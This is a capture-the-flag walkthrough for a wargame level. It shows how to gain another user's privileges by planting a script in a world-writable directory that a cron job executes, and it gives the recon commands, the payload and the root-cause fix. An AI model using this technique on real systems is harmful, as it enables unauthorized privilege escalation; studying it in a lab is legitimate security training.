# Level 05

## 1. Target Information
- **User:** `level05`
- **Password:** `***FLAG04***`
- **Target:** `flag05`
- **SSH Port:** `4242`

---

## 2. Reconnaissance & Discovery
Search for files owned by `flag05`:

```bash
find / -user flag05 2>/dev/null
```

**Findings:**
- A cron entry runs a script **as `flag05`** every couple of minutes:
```text
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
- Inspect what that script actually does. `./usr/sbin/openarenaserver` refuses to run (`Permission denied`), so read it through an interpreter instead:
```bash
bash -x /usr/sbin/openarenaserver
```
> Why `bash` works but `./` doesn't (and `-x` is irrelevant — it only enables xtrace): `./<path>` asks the kernel to *execute* the file, which needs the **execute bit** (plus a valid shebang). The script is readable but not executable for `level05`. `bash <path>` instead launches a new `bash` that only **reads** the file, so read permission alone is enough. Direct execution needs `x`; feeding a file to an interpreter needs only `r`.
- Script contents:
```sh
#!/bin/sh

for i in /opt/openarenaserver/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```
- Key observation: every file dropped in `/opt/openarenaserver/` is executed (as `flag05`, via the cron) and then deleted. That directory is **writable by `level05`**:
```bash
ls -ld /opt/openarenaserver
# drwxrwxrwx ... /opt/openarenaserver
```

---

## 3. Vulnerability Analysis
- **Flaw Type:** Privilege escalation through a world-writable directory consumed by a privileged cron job.
- **Technical Explanation:**
  - The cron runs `openarenaserver` as `flag05`, and that script blindly `bash`-executes **anything** found in `/opt/openarenaserver/`.
  - `/opt/openarenaserver/` is writable by `level05`, so we can plant our own script there.
  - When the cron next fires, our script runs with `flag05`'s identity. Having it call `getflag` (and save the output somewhere we can read) yields the token.
  - **Root cause / fix:** a privileged job must never execute files from a directory that lower-privileged users can write to; the drop directory should be owned and writable only by `flag05`/root.

---

## 4. Exploitation Walkthrough

### Step 1: Plant a payload in the drop directory
We want `getflag` to run as `flag05` and leave its output somewhere `level05` can read.
Edit the script directly with `vim`:
```bash
vim /opt/openarenaserver/exploit.sh
```
```sh
getflag > /tmp/flag05
```

### Step 2: Wait for the cron (runs every 2 minutes)
The cron's `su - flag05` executes our script as `flag05`, then removes it.
```bash
while [ ! -f /tmp/flag05 ]; do sleep 5; done
cat /tmp/flag05
# Check flag.Here is your token : ***FLAG05***
```

> No `chmod` is needed on `/tmp/flag05`. `getflag` runs as `flag05` and the shell redirect `>` creates the file with the default umask (`022`), i.e. mode `644` — world-readable. So even though the file is **owned by `flag05`**, `level05` can `cat` it straight away.

---

## 5. Flag
```text
***FLAG05***
```
- **Next Level User:** `level06`
- **Password for next level:** `***FLAG05***`
